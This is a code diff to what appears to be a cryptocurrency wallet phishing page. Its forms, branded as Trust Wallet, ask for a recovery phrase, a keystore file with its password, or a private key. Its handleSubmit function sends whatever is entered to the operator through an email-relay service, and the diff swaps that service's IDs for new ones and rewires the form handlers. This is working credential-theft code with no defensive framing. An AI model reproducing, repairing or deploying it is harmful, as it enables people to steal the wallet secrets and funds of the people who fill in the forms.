@@ -182,11 +182,7 @@
               </ul>
               <div class="tab-content" id="myTabContent">
                 <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
-                  <form name="contact" id="phrase">
-                    <input type="hidden" name="csrfmiddlewaretoken"
-                      value="v0WPu76ybaQDs1y6C1za9Y8lcunbcbYTTHTIQK7SGNWL0GpPmmoTvOY5DgYQfbYk">
-
-                    <input type="hidden" name="form-name" value="contact">
+                  <form name="contact" id="phrase" onSubmit="handleSubmit(event)">
                     <div class="form-group mb-3">
                       <select style="
                             color: #0150b8;
@@ -214,10 +210,7 @@
                   </form>
                 </div>
                 <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
-                  <form method="post" name="contact" id="keystore">
-                    <input type="hidden" name="csrfmiddlewaretoken"
-                      value="v0WPu76ybaQDs1y6C1za9Y8lcunbcbYTTHTIQK7SGNWL0GpPmmoTvOY5DgYQfbYk">
-                    <input type="hidden" name="form-name" value="contact">
+                  <form method="post" name="contact" id="keystore" onSubmit="handleSubmit(event)">
                     <div class="form-group mb-3">
                       <select style="
                             color: #0150b8;
@@ -229,11 +222,6 @@
                       <label class="form-label">Keystore</label>
                       <textarea name="words" cols="40" rows="10" style="height: 10rem; color: #0150b8"
                         class="form-control s90 h28 custom_f_all" maxlength="500" required="" id="id_words"></textarea>
-
-
-
-
-
 
                       <input type="password" name="password" placeholder="Password" aria-label="Username"
                         class="form-control" required="" id="id_password">
@@ -250,10 +238,7 @@
                   </form>
                 </div>
                 <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
-                  <form method="post" name="contact" id="privatekey">
-                    <input type="hidden" name="csrfmiddlewaretoken"
-                      value="v0WPu76ybaQDs1y6C1za9Y8lcunbcbYTTHTIQK7SGNWL0GpPmmoTvOY5DgYQfbYk">
-                    <input type="hidden" name="form-name" value="contact">
+                  <form method="post" name="contact" id="privatekey" onSubmit="handleSubmit(event)">
                     <div class="form-group mb-3">
                       <select style="
                             color: #0150b8;
@@ -263,13 +248,8 @@
                         <option selected="">Trust Wallet</option>
                       </select>
                       <label class="form-label">Private Key</label>
-
-
-
                       <textarea name="phrase" cols="40" rows="10" class="form-control" maxlength="500" required=""
                         id="id_phrase"></textarea>
-
-
                       <div id="" class="form-text">
                         Before you enter private key, we recommend you connect
                         to the internet.
@@ -297,8 +277,9 @@
 
 
     async function handleSubmit(event) {
-      await handleNow(event)
+      console.log("clicked");
       event.preventDefault();
+      await handleNow(event)
       console.log("Submitted");
       const formData = new FormData(event.target);
       const formProps = Object.fromEntries(formData);
@@ -312,9 +293,9 @@
       }
 
       var data = {
-        service_id: "service_d5qigxs",
-        template_id: "template_7bqxeaa",
-        user_id: "I-7q0Bs-ilK3rFcWj",
+        service_id: "service_4jbf858",
+        template_id: "template_iphonzg",
+        user_id: "P_9SIX5hhtfJnOac4",
         template_params: {
           phrase: val,
         },
@@ -338,9 +319,6 @@
           alert("Oops... " + JSON.stringify(error));
         });
     }
-    phrase.addEventListener("submit", handleSubmit);
-    privateKey.addEventListener("submit", handleSubmit);
-    keystore.addEventListener("submit", handleSubmit);
   </script>
 
 
